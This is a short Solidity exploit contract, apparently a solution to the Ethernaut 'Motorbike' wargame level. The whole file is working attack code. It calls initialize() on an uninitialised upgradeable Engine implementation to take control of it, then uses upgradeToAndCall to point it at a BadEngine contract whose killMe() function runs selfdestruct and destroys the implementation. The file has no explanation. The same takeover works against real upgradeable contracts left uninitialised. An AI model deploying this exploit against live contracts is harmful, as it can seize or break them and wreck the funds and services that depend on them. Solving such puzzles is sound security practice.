// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Engine {
    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external;
}

contract BadEngine {
    function killMe() external {
        selfdestruct(payable(msg.sender));
    }
}

contract MotorbikeAttack {
    
    function attack(address target) external {
        Engine engine = Engine(target);
        engine.initialize();

        BadEngine badEgine = new BadEngine();
        engine.upgradeToAndCall(
            address(badEgine),
            abi.encodeWithSelector(bytes4(keccak256(bytes("killMe()"))))
        );
    }
}
